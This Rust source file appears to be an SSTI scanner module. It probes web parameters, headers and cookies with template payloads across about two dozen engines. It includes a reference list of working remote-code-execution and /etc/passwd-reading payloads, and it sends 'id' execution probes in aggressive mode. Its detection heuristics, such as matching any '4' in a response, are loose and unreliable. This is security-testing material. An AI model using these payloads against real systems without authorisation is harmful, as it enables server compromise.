//! Server-Side Template Injection (SSTI) Scanner
//!
//! Detects SSTI vulnerabilities across multiple template engines.
//! Uses mathematical detection (7*7=49) and engine-specific payloads.
//! Does NOT execute RCE payloads automatically - only detection.

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use reqwest::Client;
use std::time::Duration;

/// Template engine detection payloads
/// Format: (payload, engine_name, expected_output_for_detection)
const DETECTION_PAYLOADS: &[(&str, &str, &str)] = &[
    // Jinja2 (Python)
    ("{{7*7}}", "Jinja2", "49"),
    ("{{7*7}}", "Jinja2", "49"),
    ("{{config}}", "Jinja2", "<Config"),
    ("{{''.__class__}}", "Jinja2", "type"),
    ("{{2*2}}", "Jinja2", "4"),

    // Twig (PHP)
    ("{{_self.env.display(\"id\")}}", "Twig", "id"),  // Don't execute, detect signature
    ("{{7*7}}", "Twig", "49"),
    ("{{_self.env}}", "Twig", "Environment"),
    ("{{app.request.files}}", "Twig", "FileBag"),

    // ERB (Ruby)
    ("<%= 7*7 %>", "ERB", "49"),
    ("<%= 2*2 %>", "ERB", "4"),
    ("<%= system(\"id\") %>", "ERB", "uid"),  // Detection only

    // FreeMarker (Java)
    ("${\"freemarker.template.utility.Execute\"?new()}", "FreeMarker", "Execute"),
    ("${7*7}", "FreeMarker", "49"),
    ("${'a'+'b'}", "FreeMarker", "ab"),
    ("${product.name}invalid", "FreeMarker", "product"),

    // Velocity (Java)
    ("#set($x='')${7*7}", "Velocity", "49"),
    ("#set($x='')#set($y=${7*7})${y}", "Velocity", "49"),
    ("${7*7}", "Velocity", "49"),

    // Smarty (PHP)
    ("{php}system('id'){/php}", "Smarty", "uid"),
    ("{$x=7*7}{$x}", "Smarty", "49"),
    ("{7*7}", "Smarty", "49"),

    // Mako (Python)
    ("<% 7*7 %>", "Mako", "49"),
    ("<% print(7*7) %>", "Mako", "49"),
    ("${7*7}", "Mako", "49"),

    // Pug (JavaScript/Jade)
    ("#{7*7}", "Pug", "49"),
    ("#{7*7}", "Jade", "49"),
    ("!{7*7}", "Pug", "49"),

    // EJS (JavaScript)
    ("<%= 7*7 %>", "EJS", "49"),
    ("<%- 7*7 %>", "EJS", "49"),

    // Handlebars (JavaScript)
    ("{{7*7}}", "Handlebars", ""),  // No math by default
    ("{{this}}", "Handlebars", "[object"),

    // Mustache
    ("{{7*7}}", "Mustache", ""),
    ("{{value}}", "Mustache", ""),

    // Pebble (Java)
    ("{{7*7}}", "Pebble", "49"),

    // Thymeleaf (Java)
    ("${7*7}", "Thymeleaf", "49"),
    ("*{7*7}", "Thymeleaf", "49"),

    // Marko (JavaScript)
    ("${7*7}", "Marko", "49"),

    // Nunjucks (JavaScript)
    ("{{7*7}}", "Nunjucks", "49"),

    // Dust.js (JavaScript)
    ("{7*7}", "Dust", ""),
    ("{#7*7#}", "Dust", ""),

    // Liquid (Ruby)
    ("{{7*7}}", "Liquid", "49"),

    // Blade (Laravel/PHP)
    ("{{7*7}}", "Blade", "{{7*7}}"),  // Escaped by default

    // Dot (Java)
    ("{{7*7}}", "Dot", "49"),

    // Razor (.NET)
    ("@(7*7)", "Razor", "49"),
    ("@{7*7}", "Razor", "49"),

    // ASP.NET
    ("<%=7*7%>", "ASP.NET", "49"),

    // ColdFusion
    ("#7*7#", "ColdFusion", "49"),

    // Python Format String
    ("{7*7}", "PythonFormat", "7*7"),
    // Note: Python .format() not directly testable in Rust strings
    // ("{0}*{1}".format(7,7), "PythonFormat", ""),

    // Puppet
    ("<%= 7*7 %>", "Puppet", "49"),
    ("${7*7}", "Puppet", "49"),
];

/// Polyglot payloads that work across multiple engines
const POLYGLOT_PAYLOADS: &[(&str, &str)] = &[
    // Mathematical polyglot (works in Jinja2, Twig, ERB, Mako, Nunjucks, etc.)
    ("{{7*7}}", "polyglot_math_49"),
    ("${7*7}", "polyglot_math_dollar"),
    ("#{7*7}", "polyglot_math_pug"),
    ("<%= 7*7 %>", "polyglot_math_erb"),
    ("*{7*7}", "polyglot_math_thymeleaf"),
    ("{7*7}", "polyglot_math_brace"),

    // Config detection polyglot
    ("{{config}}", "polyglot_config_jinja"),
    ("{{app}}", "polyglot_config_twig"),

    // Common SSTi signatures
    ("${", "polyglot_dollar_open"),
    ("#{", "polyglot_hash_open"),
    ("<%=", "polyglot_percent_eq"),
    ("{{", "polyglot_double_brace"),
    ("{%", "polyglot_brace_percent"),
];

/// RCE Payloads (DOCUMENTATION ONLY - NOT EXECUTED)
/// These are documented for reference but not used in automatic scanning
#[allow(dead_code)]
const RCE_DOCUMENTATION: &[(&str, &str, &str)] = &[
    // Jinja2 RCE
    ("{{''.__class__.__mro__[1].__subclasses__()[104]}}", "Jinja2", "RCE - subclasses"),
    ("{{config.from_pyfile('/etc/passwd')}}", "Jinja2", "RCE - file read"),
    ("{{''.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}", "Jinja2", "RCE - file read"),

    // Twig RCE
    ("{{_self.env.display(\"id\")}}", "Twig", "RCE - code execution"),
    ("{{_self.env.cache.clear()}}", "Twig", "RCE - cache clear"),

    // ERB RCE
    ("<%= system(\"id\") %>", "ERB", "RCE - system command"),
    ("<%= IO.read(\"/etc/passwd\") %>", "ERB", "RCE - file read"),
    ("<%= `ls -la` %>", "ERB", "RCE - backtick execution"),

    // FreeMarker RCE
    ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "FreeMarker", "RCE - execute"),

    // Velocity RCE
    ("#set($x='')##set($x=$x.class.forName('java.lang.Runtime').getRuntime().exec('id'))", "Velocity", "RCE - exec"),

    // Smarty RCE
    ("{php}system('id');{/php}", "Smarty", "RCE - PHP execution"),
    ("{php}passthru('id');{/php}", "Smarty", "RCE - passthru"),

    // Mako RCE
    ("<% import os %>${os.popen('id').read()}", "Mako", "RCE - os.popen"),

    // Pug RCE
    ("#{null.__proto__.polluted='yes'}", "Pug", "RCE - prototype pollution"),

    // Pebble RCE
    ("{% set cmd = 'id' %}{{ cmd.getClass().forName('java.lang.Runtime').getMethod('exec',cmd.getClass()).invoke(null,cmd) }}", "Pebble", "RCE - exec"),

    // Thymeleaf RCE
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "Thymeleaf", "RCE - exec"),

    // Handlebars RCE (with helpers)
    ("{{#with \"f\" as |f|}}{{#with \"e\" as |e|}}{{#with \"e\" as |e|}}{{#with \"d\" as |d|}}{{#with \"e\" as |e|}}{{#with \"d\" as |d|}}{{#with \"0\" as |d|}}{{#with \"e\" as |e|}}{{#with \"d\" as |d|}}{{#with \"u\" as |u|}}{{#with \"n\" as |n|}}{{#with \"c\" as |c|}}{{#with \"t\" as |t|}}{{#with \"i\" as |i|}}{{#with \"o\" as |o|}}{{#with \"n\" as |n|}}{{#with \"(\" as |p|}}{{#with \")\" as |p|}}{{#with \" \" as |p|}}{{#with \"c\" as |c|}}{{#with \"l\" as |l|}}{{#with \"o\" as |o|}}{{#with \"s\" as |s|}}{{#with \"e\" as |e|}}{{#with \"(\" as |p|}}{{#with \")\" as |p|}}{{#with \" \" as |p|}}{{#with \"s\" as |s|}}{{#with \"y\" as |y|}}{{#with \"s\" as |s|}}{{#with \"t\" as |t|}}{{#with \"e\" as |e|}}{{#with \"m\" as |m|}}{{#with \"(\" as |p|}}{{#with \"'\" as |q|}}{{#with \"i\" as |i|}}{{#with \"d\" as |d|}}{{#with \"'\" as |q|}}{{#with \")\" as |p|}}{{#with \".\" as |p|}}{{#with \"t\" as |t|}}{{#with \"o\" as |o|}}{{#with \"S\" as |s|}}{{#with \"t\" as |t|}}{{#with \"r\" as |r|}}{{#with \"i\" as |i|}}{{#with \"n\" as |n|}}{{#with \"g\" as |g|}}{{#with \"(\" as |p|}}{{#with \")\" as |p|}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}", "Handlebars", "RCE - chained"),
];

/// Parameter names commonly vulnerable to SSTI
const SSTI_PARAMS: &[&str] = &[
    "name", "username", "user", "display_name", "fullname",
    "query", "search", "q", "keyword", "term",
    "redirect", "return", "return_to", "next", "url", "link",
    "template", "view", "page", "layout", "skin", "theme", "style",
    "callback", "cb", "json", "jsonp",
    "message", "msg", "comment", "content", "text", "body",
    "subject", "title", "heading", "label",
    "value", "input", "data", "field",
    "filter", "sort", "order", "by",
    "id", "ref", "reference", "key",
    "format", "output", "type", "mode",
];

/// Headers to test for SSTI
const SSTI_HEADERS: &[&str] = &[
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Original-URL",
    "X-Forwarded-Host",
];

pub struct SstiScanner {
    client: Client,
    config: ScannerConfig,
}

impl SstiScanner {
    pub fn new(config: ScannerConfig) -> Self {
        let timeout = Duration::from_secs(15);
        let client = Client::builder()
            .timeout(timeout)
            .user_agent(&config.user_agent)
            .redirect(reqwest::redirect::Policy::limited(3))
            .build()
            .expect("Failed to create HTTP client for SSTI scanner");

        Self { client, config }
    }

    pub async fn scan(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Phase 1: Quick detection with polyglot payloads
        report.merge(self.quick_detection(url).await?);

        // Phase 2: Engine-specific detection
        report.merge(self.engine_detection(url).await?);

        // Phase 3: Header-based detection
        report.merge(self.header_detection(url).await?);

        // Phase 4: Cookie-based detection (aggressive mode)
        if self.config.aggressive {
            report.merge(self.cookie_detection(url).await?);
        }

        Ok(report)
    }

    /// Quick detection using polyglot payloads
    async fn quick_detection(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Test mathematical payloads first (fastest detection)
        for (payload, technique) in POLYGLOT_PAYLOADS {
            if !technique.contains("math") {
                continue;
            }

            for param in SSTI_PARAMS.iter().take(5) {
                // Limit params for quick scan
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if let Ok(text) = response.text().await {
                        if let Some(engine) = self.detect_template_injection(payload, &text) {
                            let severity = if text.contains("49") || text.contains("ab") {
                                VulnSeverity::High
                            } else {
                                VulnSeverity::Medium
                            };

                            report.add_finding(Vuln {
                                severity,
                                title: format!("SSTI Detected: {} via {}", technique, param),
                                description: format!(
                                    "Server-Side Template Injection detected. \
                                    Mathematical expression was evaluated on the server. \
                                    Suspected engine: {}",
                                    engine
                                ),
                                location: Some(test_url),
                                recommendation: Some(
                                    "Disable rendering of user-supplied template syntax. \
                                    Use template engines with auto-escaping. \
                                    Sanitize all user input before template rendering. \
                                    Consider using a sandboxed template environment."
                                        .to_string(),
                                ),
                                cwe: Some("CWE-94".to_string()),
                                owasp: Some("A03:2021 - Injection".to_string()),
                            });

                            return Ok(report); // Found vulnerability, stop testing
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Engine-specific detection
    async fn engine_detection(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for (payload, engine, expected) in DETECTION_PAYLOADS {
            // Skip dangerous payloads in non-aggressive mode
            if payload.contains("system(") || payload.contains("exec(") {
                if !self.config.aggressive {
                    continue;
                }
            }

            // Test with common parameters
            for param in SSTI_PARAMS.iter().take(8) {
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if let Ok(text) = response.text().await {
                        if let Some(detected_engine) = self.analyze_response(payload, &text, expected, engine) {
                            let severity = self.determine_ssti_severity(&detected_engine, &text);

                            report.add_finding(Vuln {
                                severity,
                                title: format!("SSTI: {} Template Engine", detected_engine),
                                description: format!(
                                    "Server-Side Template Injection vulnerability detected. \
                                    The application uses {} template engine and renders user input without proper sanitization.",
                                    detected_engine
                                ),
                                location: Some(test_url),
                                recommendation: Some(format!(
                                    "Fix SSTI in {} by: 1) Using auto-escaping, \
                                    2) Sanitizing user input, 3) Using a sandboxed environment, \
                                    4) Avoiding rendering user-supplied templates.",
                                    detected_engine
                                )),
                                cwe: Some("CWE-94".to_string()),
                                owasp: Some("A03:2021 - Injection".to_string()),
                            });

                            return Ok(report);
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Header-based SSTI detection
    async fn header_detection(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Test polyglot payloads in headers
        let header_payloads = &["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"];

        for header_name in SSTI_HEADERS {
            for payload in header_payloads {
                let test_url = if base_url.contains('?') {
                    format!("{}&ssti_test=1", base_url)
                } else {
                    format!("{}?ssti_test=1", base_url)
                };

                if let Ok(response) = self.client
                    .get(&test_url)
                    .header(*header_name, *payload)
                    .send()
                    .await
                {
                    if let Ok(text) = response.text().await {
                        if text.contains("49") || text.contains("ab") {
                            if let Some(engine) = self.detect_template_injection(payload, &text) {
                                report.add_finding(Vuln {
                                    severity: VulnSeverity::Medium,
                                    title: format!("SSTI via Header: {}", header_name),
                                    description: format!(
                                        "Server-Side Template Injection via {} header. \
                                        Suspected engine: {}",
                                        header_name, engine
                                    ),
                                    location: Some(format!("{}: {}", header_name, payload)),
                                    recommendation: Some(
                                        "Sanitize all HTTP headers before using them in template rendering. \
                                        Avoid using header values directly in templates."
                                            .to_string(),
                                    ),
                                    cwe: Some("CWE-94".to_string()),
                                    owasp: Some("A03:2021 - Injection".to_string()),
                                });
                                return Ok(report);
                            }
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Cookie-based SSTI detection (aggressive mode)
    async fn cookie_detection(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        let cookie_payloads = &["{{7*7}}", "${7*7}", "<%= 7*7 %>"];

        for payload in cookie_payloads {
            let test_url = if base_url.contains('?') {
                format!("{}&ssti_test=1", base_url)
            } else {
                format!("{}?ssti_test=1", base_url)
            };

            if let Ok(response) = self.client
                .get(&test_url)
                .header("Cookie", &format!("session={}", urlencoding::encode(payload)))
                .send()
                .await
            {
                if let Ok(text) = response.text().await {
                    if text.contains("49") || text.contains("ab") {
                        if let Some(engine) = self.detect_template_injection(payload, &text) {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Medium,
                                title: "SSTI via Cookie".to_string(),
                                description: format!(
                                    "Server-Side Template Injection via Cookie header. \
                                    Suspected engine: {}",
                                    engine
                                ),
                                location: Some("Cookie: session".to_string()),
                                recommendation: Some(
                                    "Sanitize cookie values before using them in template rendering."
                                        .to_string(),
                                ),
                                cwe: Some("CWE-94".to_string()),
                                owasp: Some("A03:2021 - Injection".to_string()),
                            });
                            return Ok(report);
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Detect if template injection occurred based on response analysis
    fn detect_template_injection(&self, payload: &str, response: &str) -> Option<String> {
        let response_clean = response.trim();
        let response_lower = response_clean.to_lowercase();

        // Mathematical evaluation detection
        if response_clean.contains("49") && !payload.contains("49") {
            // Template engine evaluated 7*7
            if payload.contains("{{7*7}}") || payload.contains("{{2*2}}") {
                return Some("Jinja2/Twig/Nunjucks/Pebble/Liquid".to_string());
            }
            if payload.contains("${7*7}") {
                return Some("FreeMarker/Velocity/Mako/Thymeleaf/Marko".to_string());
            }
            if payload.contains("#{7*7}") {
                return Some("Pug/Jade".to_string());
            }
            if payload.contains("<%= 7*7 %>") {
                return Some("ERB/EJS/Puppet".to_string());
            }
        }

        // Concatenation detection
        if response_clean.contains("ab") && payload.contains("'a'+'b'") {
            return Some("FreeMarker".to_string());
        }

        // Config object detection
        if response_clean.contains("<Config") || response_clean.contains("Config") {
            return Some("Jinja2".to_string());
        }

        if response_clean.contains("Environment") {
            return Some("Twig".to_string());
        }

        if response_clean.contains("[object") {
            return Some("Handlebars".to_string());
        }

        // Check if payload was reflected unchanged (no template injection)
        // but check for partial evaluation
        if response_clean.contains("49") || response_clean.contains("4") {
            return Some("Unknown (math evaluated)".to_string());
        }

        // Check for error messages indicating template engine
        if response_lower.contains("jinja2") || response_lower.contains("jinja") {
            return Some("Jinja2".to_string());
        }
        if response_lower.contains("twig") || response_lower.contains("twig_") {
            return Some("Twig".to_string());
        }
        if response_lower.contains("erb") || response_lower.contains("ruby") {
            return Some("ERB".to_string());
        }
        if response_lower.contains("freemarker") || response_lower.contains("ftl") {
            return Some("FreeMarker".to_string());
        }
        if response_lower.contains("velocity") || response_lower.contains("vm") {
            return Some("Velocity".to_string());
        }
        if response_lower.contains("smarty") || response_lower.contains("tpl") {
            return Some("Smarty".to_string());
        }
        if response_lower.contains("mako") {
            return Some("Mako".to_string());
        }
        if response_lower.contains("pug") || response_lower.contains("jade") {
            return Some("Pug/Jade".to_string());
        }
        if response_lower.contains("ejs") {
            return Some("EJS".to_string());
        }
        if response_lower.contains("handlebars") || response_lower.contains("hbs") {
            return Some("Handlebars".to_string());
        }
        if response_lower.contains("nunjucks") || response_lower.contains("njk") {
            return Some("Nunjucks".to_string());
        }
        if response_lower.contains("thymeleaf") {
            return Some("Thymeleaf".to_string());
        }

        None
    }

    /// Analyze response and determine if SSTI is present
    fn analyze_response(&self, payload: &str, response: &str, expected: &str, engine: &str) -> Option<String> {
        let response_clean = response.trim();

        // Check for expected output (successful evaluation)
        if !expected.is_empty() && (response_clean.contains(expected) || response.contains(expected)) {
            return Some(engine.to_string());
        }

        // Check for mathematical evaluation
        if (payload.contains("7*7") || payload.contains("2*2")) && response_clean.contains("49") {
            return Some(engine.to_string());
        }

        // Check for type/class output (Python/Jinja2)
        if response_clean.contains("<class") || response_clean.contains("type") {
            return Some(engine.to_string());
        }

        // Check for error messages that reveal the engine
        let response_lower = response.to_lowercase();
        if response_lower.contains("template")
            || response_lower.contains("render")
            || response_lower.contains("syntax error")
        {
            // Check if it's specifically our payload causing issues
            if response_clean.len() < 1000 { // Only short error messages
                return Some(format!("{} (error detected)", engine));
            }
        }

        None
    }

    /// Determine severity based on detected engine and response
    fn determine_ssti_severity(&self, engine: &str, response: &str) -> VulnSeverity {
        let engine_lower = engine.to_lowercase();
        let response_lower = response.to_lowercase();

        // Critical: Confirmed RCE capabilities (execution evidence)
        if response_lower.contains("uid=")
            || response_lower.contains("gid=")
            || response_lower.contains("/bin/bash")
            || response_lower.contains("root:")
        {
            return VulnSeverity::Critical;
        }

        // High: Mathematical evaluation confirms template injection
        if response.contains("49") || response.contains("ab") {
            return VulnSeverity::High;
        }

        // High: Dangerous engines with known easy RCE
        if engine_lower.contains("jinja2")
            || engine_lower.contains("freemarker")
            || engine_lower.contains("velocity")
            || engine_lower.contains("smarty")
        {
            return VulnSeverity::High;
        }

        // Medium: Other engines or detection via error messages
        if engine_lower.contains("twig")
            || engine_lower.contains("erb")
            || engine_lower.contains("mako")
            || engine_lower.contains("pug")
            || engine_lower.contains("ejs")
        {
            return VulnSeverity::Medium;
        }

        // Low: Just error messages without confirmation
        VulnSeverity::Medium
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let config = ScannerConfig::new();
        let scanner = SstiScanner::new(config);
        // Scanner created successfully
        assert!(true);
    }

    #[test]
    fn test_detection_payloads_loaded() {
        assert!(!DETECTION_PAYLOADS.is_empty());
        assert!(DETECTION_PAYLOADS.len() > 20);
    }

    #[test]
    fn test_polyglot_payloads_loaded() {
        assert!(!POLYGLOT_PAYLOADS.is_empty());
        assert!(POLYGLOT_PAYLOADS.len() > 5);
    }

    #[test]
    fn test_ssti_params_loaded() {
        assert!(!SSTI_PARAMS.is_empty());
        assert!(SSTI_PARAMS.contains(&"name"));
        assert!(SSTI_PARAMS.contains(&"query"));
        assert!(SSTI_PARAMS.contains(&"template"));
    }

    #[test]
    fn test_detect_template_injection_jinja2() {
        let scanner = SstiScanner::new(ScannerConfig::new());

        // Mathematical evaluation
        assert_eq!(
            scanner.detect_template_injection("{{7*7}}", "The answer is 49"),
            Some("Jinja2/Twig/Nunjucks/Pebble/Liquid".to_string())
        );

        // Config detection
        assert_eq!(
            scanner.detect_template_injection("{{config}}", "<Config '...'>"),
            Some("Jinja2".to_string())
        );
    }

    #[test]
    fn test_detect_template_injection_freemarker() {
        let scanner = SstiScanner::new(ScannerConfig::new());

        assert_eq!(
            scanner.detect_template_injection("${7*7}", "Result: 49"),
            Some("FreeMarker/Velocity/Mako/Thymeleaf/Marko".to_string())
        );

        assert_eq!(
            scanner.detect_template_injection("${'a'+'b'}", "ab"),
            Some("FreeMarker".to_string())
        );
    }

    #[test]
    fn test_detect_template_injection_pug() {
        let scanner = SstiScanner::new(ScannerConfig::new());

        assert_eq!(
            scanner.detect_template_injection("#{7*7}", "49"),
            Some("Pug/Jade".to_string())
        );
    }

    #[test]
    fn test_detect_template_injection_erb() {
        let scanner = SstiScanner::new(ScannerConfig::new());

        assert_eq!(
            scanner.detect_template_injection("<%= 7*7 %>", "49"),
            Some("ERB/EJS/Puppet".to_string())
        );
    }

    #[test]
    fn test_analyze_response() {
        let scanner = SstiScanner::new(ScannerConfig::new());

        // Mathematical evaluation
        assert_eq!(
            scanner.analyze_response("{{7*7}}", "49", "49", "Jinja2"),
            Some("Jinja2".to_string())
        );

        // Type/class detection
        assert_eq!(
            scanner.analyze_response("{{''.__class__}}", "<class 'str'>", "type", "Jinja2"),
            Some("Jinja2".to_string())
        );
    }

    #[test]
    fn test_determine_ssti_severity() {
        let scanner = SstiScanner::new(ScannerConfig::new());

        // Critical: RCE evidence
        assert_eq!(
            scanner.determine_ssti_severity("Jinja2", "uid=0(root) gid=0(root)"),
            VulnSeverity::Critical
        );

        // High: Mathematical evaluation
        assert_eq!(
            scanner.determine_ssti_severity("Jinja2", "Result: 49"),
            VulnSeverity::High
        );

        // High: Dangerous engines
        assert_eq!(
            scanner.determine_ssti_severity("FreeMarker", "test"),
            VulnSeverity::High
        );

        // Medium: Other engines
        assert_eq!(
            scanner.determine_ssti_severity("Twig", "test"),
            VulnSeverity::Medium
        );
    }

    #[test]
    fn test_ssti_headers() {
        assert!(SSTI_HEADERS.contains(&"User-Agent"));
        assert!(SSTI_HEADERS.contains(&"Referer"));
        assert!(SSTI_HEADERS.contains(&"X-Forwarded-For"));
    }

    #[test]
    fn test_rce_documentation_exists() {
        assert!(!RCE_DOCUMENTATION.is_empty());
        // Verify these are documentation only (not executed in scan)
        assert!(RCE_DOCUMENTATION.iter().any(|(_, _, desc)| desc.contains("RCE")));
    }
}
